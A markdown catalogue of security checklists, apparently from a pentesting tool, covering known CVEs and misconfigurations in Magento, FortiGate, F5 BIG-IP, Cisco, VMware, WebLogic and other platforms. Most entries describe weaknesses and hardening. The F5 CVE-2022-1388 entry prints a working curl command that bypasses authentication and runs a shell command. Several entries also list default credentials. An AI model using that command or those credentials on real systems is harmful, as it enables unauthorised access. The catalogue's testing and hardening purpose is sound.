<!-- id: magento | icon: 🛠️ | color: #e06c75 -->
Security checklists for Magento e-commerce platform hardening and vulnerability testing.

### Check for exposed Magento admin panel
<!-- id: magento-1 | severity: high | tags: magento, admin, brute-force -->
Magento admin is commonly found at /admin or /admin_[random-hash]. Weak passwords compromise the entire store, customer PII, and payment information.

**References:**
- https://devdocs.magento.com/guides/v2.4/install-gde/install/cli/install-cli-adminurl.html

### Check for Magento SQL injection — Shoplift Bug (CVE-2015-1397)
<!-- id: magento-2 | severity: critical | tags: magento, sqli, cve -->
The Shoplift SQL injection bug in older Magento versions allows unauthenticated admin account creation and full store compromise with a single HTTP request.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1397

---

## Fortinet FortiGate
<!-- id: fortigate | icon: 🛠️ | color: #e06c75 -->
Security checklists for Fortinet FortiGate SSL VPN and firewall appliance security testing.

### Check for FortiGate SSL VPN path traversal (CVE-2018-13379)
<!-- id: fortigate-1 | severity: critical | tags: fortigate, ssl-vpn, path-traversal, cve -->
CVE-2018-13379 allows unauthenticated path traversal on FortiGate SSL VPN, exposing session files that contain plaintext VPN user credentials.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379

### Check FortiGate for exposed management interface
<!-- id: fortigate-2 | severity: high | tags: fortigate, management, unauthorized-access -->
FortiGate management interfaces exposed to the internet are prime targets. Verify default admin credentials are changed, management is restricted by IP, and all patches are applied.

**References:**
- https://www.fortiguard.com/psirt

### CVE-2022-40684 — Authentication bypass in FortiOS/FortiProxy/FortiSwitchManager (Critical, CVSS 9.8)
<!-- id: fortigate-cve-2022-40684 | severity: critical | tags: fortigate, cve, auth-bypass, management -->
Vulnerable: FortiOS 7.0.x before 7.0.7, 7.2.x before 7.2.2; FortiProxy 1.1.x–7.0.x; FortiSwitchManager 7.0.x and 7.2.0. An authentication bypass on the management interface allows unauthenticated attackers to perform operations on the administrative interface via crafted HTTP or HTTPS requests. Exploited in the wild as a zero-day.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40684

### CVE-2023-27997 — Heap buffer overflow RCE in SSL-VPN (Critical, CVSS 9.8)
<!-- id: fortigate-cve-2023-27997 | severity: critical | tags: fortigate, cve, rce, ssl-vpn, heap-overflow -->
Vulnerable: FortiOS before 6.0.17, 6.2.15, 6.4.13, 7.0.12, 7.2.5; FortiProxy before 1.2.13, 2.0.12, 7.0.10, 7.2.4. A heap-based buffer overflow in the SSL-VPN pre-authentication phase allows unauthenticated RCE. Actively exploited by nation-state actors.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27997

---

## Elasticsearch
<!-- id: elasticsearch | icon: 🛠️ | color: #e06c75 -->
Security checklists for Elasticsearch search engine and data store exposure testing.

### Check for unauthenticated Elasticsearch access
<!-- id: elastic-1 | severity: critical | tags: elasticsearch, unauthorized-access, data-exposure -->
Elasticsearch without X-Pack security enabled exposes all indices and documents to anyone. Port 9200 is frequently found open and unprotected on the public internet.

**References:**
- https://www.elastic.co/guide/en/elasticsearch/reference/current/security-minimal-setup.html

### Check Elasticsearch for cluster-wide data enumeration
<!-- id: elastic-2 | severity: high | tags: elasticsearch, enumeration, info-disclosure -->
The /_cat/indices and /_all endpoints list every index in the cluster, often revealing PII, credentials, logs, and internal application data stored across all indices.

**References:**
- https://www.elastic.co/guide/en/elasticsearch/reference/current/cat-indices.html

### CVE-2021-22145 — Memory disclosure in Elasticsearch (Medium)
<!-- id: elastic-cve-2021-22145 | severity: medium | tags: elasticsearch, cve, memory-disclosure, info-disclosure -->
Vulnerable: Elasticsearch 7.10.0–7.13.0. An authenticated attacker can trigger an assertion failure on the coordinating node via a sequence of specific API requests, leading to disclosure of memory contents from the Java heap.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22145

### CVE-2023-31419 — Stack overflow DoS via specially crafted search request (High)
<!-- id: elastic-cve-2023-31419 | severity: high | tags: elasticsearch, cve, dos, stack-overflow -->
Vulnerable: Elasticsearch 8.0.0–8.9.0. A specially crafted search request containing an excessively nested search body can cause a stack overflow, crashing the node. No authentication required if the cluster is exposed. Upgrade to 8.9.1+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-31419

---

## Laravel
<!-- id: laravel | icon: 🛠️ | color: #e06c75 -->
Security checklists for Laravel PHP framework applications.

### Check for Laravel debug mode enabled in production
<!-- id: laravel-1 | severity: high | tags: laravel, debug, info-disclosure -->
Laravel with APP_DEBUG=true exposes full stack traces, environment variables, and database credentials in error responses.

**References:**
- https://laravel.com/docs/configuration#debug-mode

### Check for exposed Laravel .env file
<!-- id: laravel-2 | severity: critical | tags: laravel, env, credentials, info-disclosure -->
The .env file contains database credentials, API keys, and secrets. It must never be web-accessible.

**References:**
- https://laravel.com/docs/configuration#environment-configuration

---

## Django
<!-- id: django | icon: 🛠️ | color: #e06c75 -->
Security checklists for Django Python web framework applications.

### Check for Django debug mode and detailed error pages
<!-- id: django-1 | severity: high | tags: django, debug, info-disclosure -->
Django with DEBUG=True renders detailed error pages containing source code, local variables, and settings data visible to any user triggering an error.

**References:**
- https://docs.djangoproject.com/en/stable/ref/settings/#debug

### Check Django admin panel exposure
<!-- id: django-2 | severity: medium | tags: django, admin, brute-force -->
Django admin at /admin/ is a well-known path. Weak credentials or absence of 2FA allow full backend database access.

**References:**
- https://docs.djangoproject.com/en/stable/ref/contrib/admin/

---

## Ruby on Rails
<!-- id: rails | icon: 🛠️ | color: #e06c75 -->
Security checklists for Ruby on Rails web framework applications.

### Check Rails for mass assignment vulnerabilities
<!-- id: rails-1 | severity: high | tags: rails, mass-assignment, parameter-tampering -->
Rails without strong parameter filtering allows attackers to modify protected model attributes (e.g. admin, role) by injecting extra parameters.

**References:**
- https://guides.rubyonrails.org/action_controller_overview.html#strong-parameters

### Check for Rails secret_key_base exposure leading to RCE
<!-- id: rails-2 | severity: critical | tags: rails, secret-key, rce -->
If the Rails secret_key_base leaks via source code or error pages, attackers can forge signed session cookies and achieve Remote Code Execution.

**References:**
- https://guides.rubyonrails.org/security.html#session-storage

---

## Flask
<!-- id: flask | icon: 🛠️ | color: #e06c75 -->
Security checklists for Flask Python micro-framework applications.

### Check Flask for debug mode and Werkzeug interactive debugger
<!-- id: flask-1 | severity: critical | tags: flask, debug, rce -->
Flask with debug=True exposes the Werkzeug interactive debugger with a Python console per stack frame, enabling direct RCE from the browser.

**References:**
- https://werkzeug.palletsprojects.com/en/latest/debug/

### Check Flask for weak secret key enabling session forgery
<!-- id: flask-2 | severity: high | tags: flask, secret-key, session-forgery -->
Flask signs session cookies with a secret key. Weak or guessable keys allow attackers to forge sessions and escalate privileges.

**References:**
- https://flask.palletsprojects.com/en/latest/config/#SECRET_KEY

---

## Joomla
<!-- id: joomla | icon: 🛠️ | color: #e06c75 -->
Security checklists for Joomla content management system hardening.

### Check for exposed Joomla administrator panel
<!-- id: joomla-1 | severity: medium | tags: joomla, admin, brute-force -->
Joomla admin at /administrator/ is easily discoverable. Weak passwords allow full CMS control including template PHP injection.

**References:**
- https://docs.joomla.org/Security_Checklist/Joomla!_Setup

### Check Joomla for outdated extensions with known CVEs
<!-- id: joomla-2 | severity: high | tags: joomla, extensions, sqli, rce -->
Third-party Joomla extensions are a frequent source of SQLi, LFI, and RCE. Check installed versions against the Joomla Vulnerable Extensions List.

**References:**
- https://vel.joomla.org/

---

## ASP.NET
<!-- id: aspnet | icon: 🛠️ | color: #e06c75 -->
Security checklists for Microsoft ASP.NET and ASP.NET Core web applications.

### Check for ASP.NET ViewState deserialization via MachineKey
<!-- id: aspnet-1 | severity: critical | tags: aspnet, viewstate, deserialization, rce -->
ASP.NET with a known or guessable MachineKey allows forging malicious ViewState payloads triggering deserialization-based Remote Code Execution.

**References:**
- https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/

### Check for exposed ASP.NET diagnostic endpoints
<!-- id: aspnet-2 | severity: medium | tags: aspnet, diagnostics, info-disclosure -->
ASP.NET may expose elmah.axd and trace.axd endpoints leaking exception details, request logs, and internal error data.

**References:**
- https://docs.microsoft.com/en-us/aspnet/core/diagnostics/

---

## Symfony
<!-- id: symfony | icon: 🛠️ | color: #e06c75 -->
Security checklists for Symfony PHP framework applications.

### Check for Symfony debug toolbar and profiler exposure
<!-- id: symfony-1 | severity: high | tags: symfony, debug, info-disclosure -->
Symfony web profiler at /_profiler exposes request details, environment variables, database queries, and application internals in development mode.

**References:**
- https://symfony.com/doc/current/profiler.html

### Check for leaked Symfony APP_SECRET
<!-- id: symfony-2 | severity: high | tags: symfony, secret, csrf, session-forgery -->
The APP_SECRET is used for CSRF tokens and signed cookies. Leaking it via source code or .env allows CSRF bypass and session forgery.

**References:**
- https://symfony.com/doc/current/configuration/secrets.html

---

## Shopify
<!-- id: shopify | icon: 🛠️ | color: #e06c75 -->
Security checklists for Shopify e-commerce storefronts and app integrations.

### Check Shopify app webhooks for missing HMAC validation
<!-- id: shopify-1 | severity: high | tags: shopify, webhook, hmac, bypass -->
Shopify webhooks must be validated using HMAC-SHA256. Apps skipping validation accept forged webhook payloads from any attacker.

**References:**
- https://shopify.dev/docs/apps/build/webhooks/secure/validate-webhooks

### Check Shopify for exposed Storefront API tokens in JavaScript
<!-- id: shopify-2 | severity: high | tags: shopify, api-key, info-disclosure, javascript -->
Shopify Storefront API tokens embedded in client-side JS with broad scopes allow attackers to enumerate products, customers, and orders.

**References:**
- https://shopify.dev/docs/api/storefront

---

## OpenCart
<!-- id: opencart | icon: 🛠️ | color: #e06c75 -->
Security checklists for OpenCart e-commerce platform hardening.

### Check for exposed OpenCart admin with default credentials
<!-- id: opencart-1 | severity: high | tags: opencart, admin, default-creds -->
OpenCart admin at /admin/ ships with default credentials (admin/admin). Admin access enables PHP execution via template and extension modification.

**References:**
- https://docs.opencart.com/en-gb/administration/

---

## PrestaShop
<!-- id: prestashop | icon: 🛠️ | color: #e06c75 -->
Security checklists for PrestaShop e-commerce platform hardening.

### Check PrestaShop modules for SQL injection (CVE-2023-30839)
<!-- id: prestashop-1 | severity: critical | tags: prestashop, sqli, cve, modules -->
Multiple PrestaShop modules have suffered unauthenticated SQL injection enabling full database extraction and admin account creation.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30839

### Check for exposed PrestaShop install directory
<!-- id: prestashop-2 | severity: high | tags: prestashop, install, misconfiguration -->
The /install directory left after setup allows reinstallation and full configuration override. Remove it immediately after deployment.

**References:**
- https://devdocs.prestashop-project.org/8/basics/installation/

---

## TYPO3
<!-- id: typo3 | icon: 🛠️ | color: #e06c75 -->
Security checklists for TYPO3 enterprise content management system.

### Check TYPO3 backend for default credentials
<!-- id: typo3-1 | severity: high | tags: typo3, admin, default-creds -->
TYPO3 backend at /typo3/ with default credentials (admin/password) allows full CMS control including PHP execution via TypoScript.

**References:**
- https://docs.typo3.org/m/typo3/guide-security/main/en-us/

### Check TYPO3 for phar deserialization RCE (CVE-2019-12747)
<!-- id: typo3-2 | severity: critical | tags: typo3, deserialization, rce, cve -->
Versions below 8.7.27 and 9.5.8 are vulnerable to phar deserialization leading to RCE via malicious file upload.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12747

---

## Ghost CMS
<!-- id: ghost-cms | icon: 🛠️ | color: #e06c75 -->
Security checklists for Ghost blogging and publishing platform.

### Check Ghost admin for weak credentials
<!-- id: ghost-1 | severity: medium | tags: ghost, admin, default-creds -->
Ghost admin at /ghost/ with weak credentials allows full content management, theme upload, and code injection via Handlebars templates.

**References:**
- https://ghost.org/docs/security/

### Check Ghost for SSRF via webhooks
<!-- id: ghost-2 | severity: high | tags: ghost, ssrf, webhooks -->
Ghost webhooks and integrations can trigger HTTP requests to internal services, enabling SSRF to cloud metadata endpoints.

**References:**
- https://ghost.org/docs/webhooks/

---

## Craft CMS
<!-- id: craft-cms | icon: 🛠️ | color: #e06c75 -->
Security checklists for Craft CMS PHP content management system.

### Check Craft CMS for SSTI via Twig template injection
<!-- id: craft-1 | severity: critical | tags: craft-cms, ssti, twig, rce -->
Insufficient output escaping on user-supplied content rendered through Twig templates can lead to SSTI and Remote Code Execution.

**References:**
- https://twig.symfony.com/doc/3.x/sandbox.html

---

## Strapi
<!-- id: strapi | icon: 🛠️ | color: #e06c75 -->
Security checklists for Strapi headless CMS security testing.

### Check Strapi for unauthenticated admin registration (CVE-2019-19609)
<!-- id: strapi-1 | severity: critical | tags: strapi, admin-registration, rce, cve -->
Strapi before 3.0.0-beta.17.8 allowed unauthenticated admin user creation and RCE. Ensure admin registration is properly protected.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19609

### Check Strapi API for broken object-level authorization
<!-- id: strapi-2 | severity: high | tags: strapi, idor, bola, api -->
Strapi REST and GraphQL APIs may expose all content types without authentication when permissions are misconfigured, leaking private data.

**References:**
- https://docs.strapi.io/cms/user-guide/users-roles-permissions

---

## MediaWiki
<!-- id: mediawiki | icon: 🛠️ | color: #e06c75 -->
Security checklists for MediaWiki, the software powering Wikipedia.

### Check MediaWiki for exposed API and private content
<!-- id: mediawiki-1 | severity: medium | tags: mediawiki, info-disclosure, api -->
MediaWiki Special:Export and API may expose private wiki content, user data, and deleted revisions depending on permission configuration.

**References:**
- https://www.mediawiki.org/wiki/Security

---

## Moodle
<!-- id: moodle | icon: 🛠️ | color: #e06c75 -->
Security checklists for Moodle learning management system.

### Check Moodle for RCE via Spellcheck injection (CVE-2020-14321)
<!-- id: moodle-1 | severity: critical | tags: moodle, rce, cve -->
Authenticated teacher-role users can escalate to manager and achieve RCE via Spellcheck settings command injection in older Moodle versions.

**References:**
- https://moodle.org/security/

---

## phpBB
<!-- id: phpbb | icon: 🛠️ | color: #e06c75 -->
Security checklists for phpBB open-source forum software.

### Check phpBB for SQL injection in search and post parameters
<!-- id: phpbb-1 | severity: high | tags: phpbb, sqli -->
phpBB search and post parameters have historically been vulnerable to SQL injection due to insufficient input sanitization.

**References:**
- https://www.exploit-db.com/search?q=phpbb

---

## vBulletin
<!-- id: vbulletin | icon: 🛠️ | color: #e06c75 -->
Security checklists for vBulletin forum software.

### Check vBulletin for pre-auth RCE (CVE-2019-16759)
<!-- id: vbulletin-1 | severity: critical | tags: vbulletin, rce, cve -->
CVE-2019-16759 allows unauthenticated RCE on vBulletin 5.x via the widgetConfig[code] parameter in ajax/render/widget_php.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16759

---

## Microsoft SharePoint
<!-- id: sharepoint | icon: 🛠️ | color: #e06c75 -->
Security checklists for Microsoft SharePoint collaboration platform.

### Check SharePoint for pre-auth RCE (CVE-2019-0604)
<!-- id: sharepoint-1 | severity: critical | tags: sharepoint, rce, deserialization, cve -->
CVE-2019-0604 allows unauthenticated RCE on SharePoint via unsafe XML deserialization in the BdcMetadata endpoint.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0604

### Check SharePoint for exposed document libraries
<!-- id: sharepoint-2 | severity: high | tags: sharepoint, info-disclosure, documents -->
Misconfigured SharePoint with anonymous access exposes document libraries containing credentials, contracts, and internal policies.

**References:**
- https://docs.microsoft.com/en-us/sharepoint/security-for-sharepoint-server

---

## Microsoft Exchange / OWA
<!-- id: exchange | icon: 🛠️ | color: #e06c75 -->
Security checklists for Microsoft Exchange Server and Outlook Web Access.

### Check Exchange for ProxyLogon and ProxyShell (CVE-2021-26855)
<!-- id: exchange-1 | severity: critical | tags: exchange, proxylogon, proxyshell, rce, cve -->
CVE-2021-26855 (ProxyLogon) and CVE-2021-34473 (ProxyShell) allow pre-authentication RCE on Exchange Server.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26855

### Check OWA for password spraying exposure
<!-- id: exchange-2 | severity: high | tags: exchange, owa, brute-force, password-spray -->
OWA exposed on the internet is a prime target for password spraying. Verify account lockout policies, MFA enforcement, and legacy auth restrictions.

**References:**
- https://docs.microsoft.com/en-us/exchange/plan-and-deploy/deployment-ref/security-hardening

---

## Roundcube
<!-- id: roundcube | icon: 🛠️ | color: #e06c75 -->
Security checklists for Roundcube open-source webmail.

### Check Roundcube for stored XSS via crafted emails (CVE-2023-43770)
<!-- id: roundcube-1 | severity: critical | tags: roundcube, xss, cve -->
CVE-2023-43770 allows stored XSS via crafted email content in Roundcube, escalating to credential theft and account takeover.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43770

---

## Zimbra
<!-- id: zimbra | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zimbra Collaboration Suite webmail.

### Check Zimbra for pre-auth RCE via mboximport (CVE-2022-37042)
<!-- id: zimbra-1 | severity: critical | tags: zimbra, rce, file-upload, cve -->
CVE-2022-37042 allows unauthenticated RCE on Zimbra via the mboximport endpoint by uploading arbitrary files without authentication.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-37042

---

## Keycloak
<!-- id: keycloak | icon: 🛠️ | color: #e06c75 -->
Security checklists for Keycloak open-source identity and access management.

### Check Keycloak admin console for default credentials
<!-- id: keycloak-1 | severity: critical | tags: keycloak, admin, default-creds -->
Keycloak admin console at /auth/admin/ with default credentials (admin/admin) grants complete control over all realms, users, and OAuth-connected applications.

**References:**
- https://www.keycloak.org/docs/latest/server_admin/#securing-the-keycloak-server

### Check Keycloak for open redirect in OAuth flows
<!-- id: keycloak-2 | severity: high | tags: keycloak, oauth, open-redirect, token-theft -->
Misconfigured Keycloak redirect URIs with wildcard patterns allow open redirect in OAuth flows, enabling token theft.

**References:**
- https://www.keycloak.org/docs/latest/server_admin/#redirect-uris

---

## Okta
<!-- id: okta | icon: 🛠️ | color: #e06c75 -->
Security checklists for Okta identity provider and SSO platform.

### Check for Okta MFA fatigue and push bombing attacks
<!-- id: okta-1 | severity: critical | tags: okta, mfa-bypass, push-bombing -->
Attackers target Okta with MFA fatigue (push bombing), session cookie theft via XSS, and legacy authentication protocol abuse to bypass MFA entirely.

**References:**
- https://help.okta.com/en-us/content/topics/security/security-best-practices.htm

---

## F5 BIG-IP
<!-- id: f5-bigip | icon: 🛠️ | color: #e06c75 -->
Security checklists for F5 BIG-IP application delivery and security platform.

### Check F5 BIG-IP TMUI for RCE (CVE-2020-5902)
<!-- id: f5-1 | severity: critical | tags: f5, bigip, tmui, rce, cve -->
CVE-2020-5902 (CVSS 10.0) allows unauthenticated RCE on BIG-IP TMUI. The management interface must never be internet-facing.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5902

### Check F5 BIG-IP iControl REST for unauthenticated RCE (CVE-2021-22986)
<!-- id: f5-2 | severity: critical | tags: f5, bigip, rce, cve, icontrol -->
CVE-2021-22986 allows unauthenticated RCE via the iControl REST API — one of the most critical network appliance vulnerabilities of 2021.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22986

### CVE-2022-1388 — iControl REST authentication bypass (Critical, CVSS 9.8)
<!-- id: f5-cve-2022-1388 | severity: critical | tags: f5, bigip, cve, auth-bypass, icontrol -->
Vulnerable: BIG-IP 13.1.x–17.x (various patch levels). The iControl REST API allows undisclosed requests to bypass authentication, enabling unauthenticated operations including OS command execution. Massively exploited within days of disclosure.

**Commands:**
```
curl -sk -X POST -H 'Content-Type: application/json' -H 'X-F5-Auth-Token: ' -H 'Authorization: Basic YWRtaW46' 'https://target.com/mgmt/tm/util/bash' -d '{"command":"run","utilCmdArgs":"-c id"}'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388

---

## Citrix ADC / NetScaler
<!-- id: citrix-adc | icon: 🛠️ | color: #e06c75 -->
Security checklists for Citrix ADC (formerly NetScaler) application delivery controller.

### Check Citrix ADC for path traversal RCE (CVE-2019-19781)
<!-- id: citrix-1 | severity: critical | tags: citrix, path-traversal, rce, cve -->
CVE-2019-19781 allows unauthenticated path traversal and RCE on Citrix ADC and Gateway — massively exploited across the internet in 2020.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19781

---

## Ivanti Connect Secure
<!-- id: ivanti | icon: 🛠️ | color: #e06c75 -->
Security checklists for Ivanti Connect Secure (formerly Pulse Secure) SSL VPN.

### Check Pulse Secure for arbitrary file read (CVE-2019-11510)
<!-- id: ivanti-1 | severity: critical | tags: ivanti, pulse-secure, file-read, credential-leakage, cve -->
CVE-2019-11510 allows unauthenticated arbitrary file read on Pulse Secure VPN, exposing cached AD credentials, session tokens, and private keys.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11510

### Check Ivanti Connect Secure for auth bypass RCE (CVE-2023-46805)
<!-- id: ivanti-2 | severity: critical | tags: ivanti, authentication-bypass, rce, cve -->
CVE-2023-46805 chains with CVE-2024-21887 for pre-auth RCE — exploited by nation-state actors against critical infrastructure.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46805

### CVE-2024-21893 — SSRF in Ivanti SAML component (High, exploited in wild)
<!-- id: ivanti-cve-2024-21893 | severity: high | tags: ivanti, cve, ssrf, saml, server-side -->
Vulnerable: Ivanti Connect Secure 9.x, 22.x; Ivanti Policy Secure 9.x, 22.x. A server-side request forgery in the SAML component allows unauthenticated attackers to access certain restricted resources, exploited in the wild chained with CVE-2023-46805.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-21893

---

## Palo Alto Networks PAN-OS
<!-- id: paloalto | icon: 🛠️ | color: #e06c75 -->
Security checklists for Palo Alto Networks PAN-OS and GlobalProtect VPN.

### Check PAN-OS GlobalProtect for command injection RCE (CVE-2024-3400)
<!-- id: paloalto-1 | severity: critical | tags: palo-alto, rce, command-injection, cve -->
CVE-2024-3400 is a critical command injection in PAN-OS GlobalProtect allowing unauthenticated RCE with root privileges — exploited as a zero-day.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-3400

### CVE-2019-1579 — GlobalProtect Portal RCE (unauthenticated, Critical)
<!-- id: paloalto-cve-2019-1579 | severity: critical | tags: palo-alto, cve, rce, globalprotect, buffer-overflow -->
Vulnerable: PAN-OS 7.1.x before 7.1.19, 8.0.x before 8.0.12, 8.1.x before 8.1.3. A buffer overflow in the SSL VPN GlobalProtect Portal allows unauthenticated remote code execution. Upgrade to patched versions.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1579

### CVE-2020-2021 — Authentication bypass in SAML SSO (Critical, CVSS 10.0)
<!-- id: paloalto-cve-2020-2021 | severity: critical | tags: palo-alto, cve, auth-bypass, saml, sso -->
Vulnerable: PAN-OS 8.1.x before 8.1.15, 9.0.x before 9.0.9, 9.1.x before 9.1.3, 10.0.x before 10.0.1. When SAML is enabled and Verify Identity Provider Certificate is disabled, an unauthenticated attacker with network access can bypass authentication and access protected resources. CVSS 10.0.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-2021

---

## SonicWall
<!-- id: sonicwall | icon: 🛠️ | color: #e06c75 -->
Security checklists for SonicWall network security appliances and VPN.

### Check SonicWall for SQL injection auth bypass (CVE-2019-7481)
<!-- id: sonicwall-1 | severity: critical | tags: sonicwall, sqli, auth-bypass, cve -->
CVE-2019-7481 allows SQL injection on SonicWall SRA appliances leading to authentication bypass and credential leakage.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7481

---

## Juniper Networks J-Web
<!-- id: juniper | icon: 🛠️ | color: #e06c75 -->
Security checklists for Juniper Networks routing and security appliances.

### Check Juniper J-Web for pre-auth RCE (CVE-2023-36845)
<!-- id: juniper-1 | severity: critical | tags: juniper, rce, php-env, cve -->
CVE-2023-36845 allows unauthenticated PHP environment variable manipulation in Juniper J-Web, enabling pre-authentication RCE.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-36845

---

## Cisco IOS XE
<!-- id: cisco | icon: 🛠️ | color: #e06c75 -->
Security checklists for Cisco routers and switches running IOS / IOS XE.

### Check Cisco IOS XE for unauthenticated admin creation (CVE-2023-20198)
<!-- id: cisco-1 | severity: critical | tags: cisco, ios-xe, unauthorized-access, cve -->
CVE-2023-20198 allows unauthenticated creation of a privileged account on Cisco IOS XE Web UI — one of the most critical Cisco vulnerabilities ever.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-20198

### Check Cisco devices for default web management credentials
<!-- id: cisco-2 | severity: high | tags: cisco, management, default-creds -->
Cisco devices with web management and default credentials (cisco/cisco) are trivially compromised. Restrict management to trusted IP ranges.

**References:**
- https://www.cisco.com/c/en/us/support/docs/ip/access-lists/13608-21.html

### CVE-2023-20273 — Command injection chained with CVE-2023-20198 (Critical)
<!-- id: cisco-cve-2023-20273 | severity: critical | tags: cisco, ios-xe, cve, command-injection, rce -->
Vulnerable: Cisco IOS XE with Web UI enabled. CVE-2023-20273 is a command injection in the Web UI exploited in tandem with CVE-2023-20198 to install a persistent implant (webshell). Both were exploited as zero-days simultaneously against tens of thousands of devices.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-20273

---

## VMware vCenter / ESXi
<!-- id: vmware | icon: 🛠️ | color: #e06c75 -->
Security checklists for VMware vCenter Server and ESXi hypervisor.

### Check vCenter for pre-auth RCE (CVE-2021-21985)
<!-- id: vmware-1 | severity: critical | tags: vmware, vcenter, rce, cve -->
CVE-2021-21985 allows unauthenticated RCE on vCenter Server via the Virtual SAN Health Check plugin.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21985

### Check VMware ESXi for OpenSLP heap overflow (CVE-2021-21974)
<!-- id: vmware-2 | severity: critical | tags: vmware, esxi, rce, cve -->
CVE-2021-21974 is a heap overflow in OpenSLP on ESXi allowing unauthenticated RCE — exploited by the ESXiArgs ransomware campaign.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21974

### CVE-2022-22954 — Server-Side Template Injection RCE in vCenter (Critical, CVSS 9.8)
<!-- id: vmware-cve-2022-22954 | severity: critical | tags: vmware, vcenter, cve, rce, ssti -->
Vulnerable: VMware Workspace ONE Access and Identity Manager. A server-side template injection vulnerability in VMware Workspace ONE Access (vCenter component) allows unauthenticated RCE. Used in chained attack with CVE-2022-22960 for full compromise.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22954

### CVE-2023-20867 — Auth bypass in VMware Tools Guest Operations (High)
<!-- id: vmware-cve-2023-20867 | severity: high | tags: vmware, tools, cve, auth-bypass, guest-ops -->
Vulnerable: VMware Tools before 12.2.5. A fully compromised ESXi host can exploit VMware Tools' Guest Operations to perform high-privilege operations in guest VMs without requiring authentication within the VM. Enables host-to-VM lateral movement.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-20867

---

## Splunk
<!-- id: splunk | icon: 🛠️ | color: #e06c75 -->
Security checklists for Splunk log management and SIEM platform.

### Check Splunk for RCE via scripted inputs
<!-- id: splunk-1 | severity: critical | tags: splunk, rce, scripted-inputs -->
Authenticated Splunk admin or power users can execute arbitrary OS commands via scripted inputs, custom search commands, and lookup scripts.

**References:**
- https://docs.splunk.com/Documentation/Splunk/latest/Security/AboutSecuringandHardeningSplunk

### Check Splunk Web for default credentials (admin/changeme)
<!-- id: splunk-2 | severity: high | tags: splunk, default-creds, unauthorized-access -->
Splunk defaults to admin/changeme. Weak access exposes all indexed log data including security events, credentials, and PII.

**References:**
- https://docs.splunk.com/Documentation/Splunk/latest/Security/Hardeningstandards

---

## ManageEngine
<!-- id: manageengine | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zoho ManageEngine IT management suite products.

### Check ManageEngine for pre-auth RCE via SAML (CVE-2022-47966)
<!-- id: manageengine-1 | severity: critical | tags: manageengine, rce, saml, cve -->
CVE-2022-47966 affects multiple ManageEngine products — unauthenticated RCE via malicious SAML request using Apache Santuario.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-47966

### Check ManageEngine ServiceDesk for SQLi RCE (CVE-2021-44077)
<!-- id: manageengine-2 | severity: critical | tags: manageengine, servicedesk, sqli, rce, cve -->
CVE-2021-44077 in ManageEngine ServiceDesk Plus allows unauthenticated RCE via authentication bypass and arbitrary file upload — exploited by APT groups.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44077

### CVE-2022-28810 — Authenticated RCE via custom action scripts in ADSelfService Plus (High)
<!-- id: manageengine-cve-2022-28810 | severity: high | tags: manageengine, adself-service, cve, rce, authenticated -->
Vulnerable: ManageEngine ADSelfService Plus before build 6122. Authenticated administrators can execute arbitrary OS commands via custom action scripts in the authentication workflows, leveraged by ransomware operators post-compromise.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-28810

---

## Oracle WebLogic
<!-- id: weblogic | icon: 🛠️ | color: #e06c75 -->
Security checklists for Oracle WebLogic application server.

### Check WebLogic for unauthenticated RCE (CVE-2020-14882)
<!-- id: weblogic-1 | severity: critical | tags: weblogic, rce, deserialization, cve -->
CVE-2020-14882 allows unauthenticated RCE on WebLogic via the administration console — exploited within days of disclosure.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14882

### Check WebLogic admin console on ports 7001 and 7002
<!-- id: weblogic-2 | severity: critical | tags: weblogic, admin, default-creds -->
WebLogic admin console must never be internet-facing. Default credentials (weblogic/weblogic1) compromise the entire application server.

**References:**
- https://docs.oracle.com/en/middleware/standalone/weblogic-server/

